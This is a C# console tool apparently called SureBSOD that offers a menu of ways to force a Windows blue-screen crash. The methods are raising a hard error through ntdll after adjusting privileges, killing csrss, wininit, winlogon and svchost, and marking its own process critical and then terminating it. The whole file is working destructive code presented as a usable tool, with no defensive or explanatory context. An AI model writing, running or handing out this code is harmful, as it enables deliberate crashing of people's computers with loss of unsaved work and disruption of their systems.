using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace SureBSOD
{
    class Program
    {
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        static void Main(string[] args)
        {
            while (true)
            {
                try
                {
                    Console.WriteLine("\t[1] All methods");
                    Console.WriteLine("\t[2] RtlAdjustPrivilege + NtRaiseHardError");
                    Console.WriteLine("\t[3] Kill csrss + wininit + winlogon + svchost");
                    Console.WriteLine("\t[4] Make process critical then kill");
                    int selection = Convert.ToInt32(Console.ReadLine());
                    if (selection == 1)
                    {
                        Selection1();
                    }
                    else if (selection == 2)
                    {
                        Selection2();
                    }
                    else if (selection == 3)
                    {
                        Selection3();
                    }
                    else if (selection == 4)
                    {
                        Selection4();
                    }
                    else
                    {
                        Console.Clear();
                        Console.WriteLine("Invalid selection. Please try again.");
                        continue;
                    }

                    Console.WriteLine("\nFailed to induce BSOD. Press enter to try again.");
                    Console.ReadLine();
                }
                catch
                {
                    Console.Clear();
                    Console.WriteLine("\nError, press enter to try again.");
                    Console.WriteLine();
                }
            }
        }

        private static void Selection1()
        {
            try
            {
                Selection2();
                Selection3();
                Selection4();
            }
            catch (Exception err)
            {
                Console.WriteLine("ERROR! Exception details:\n\t" + err.Message);
            }
        }

        private static void Selection2() // https://github.com/peewpw/Invoke-BSOD/blob/master/Program.cs
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out Boolean t1);
                NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out uint t2);
            }
            catch (Exception err)
            {
                Console.WriteLine("ERROR! Exception details:\n\t" + err.Message);
            }
        }

        private static void Selection3()
        {
            try
            {
                string[] list = new string[] { "svchost", "csrss", "winlogon", "wininit" };
                foreach (Process process in Process.GetProcesses())
                {
                    if (!list.Contains(process.ProcessName))
                    {
                        continue;
                    }
                    else
                    {
                        Console.WriteLine(process.ProcessName);
                        process.Kill();
                    }
                }
            }
            catch (Exception err)
            {
                Console.WriteLine("ERROR! Exception details:\n\t" + err.Message);
            }
        }

        private static void Selection4()
        {
            try
            {
                Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
                Process.GetCurrentProcess().Kill();
                //Environment.FailFast(null);
            }
            catch (Exception err)
            {
                Console.WriteLine("ERROR! Exception details:\n\t" + err.Message);
            }
        }
    }
}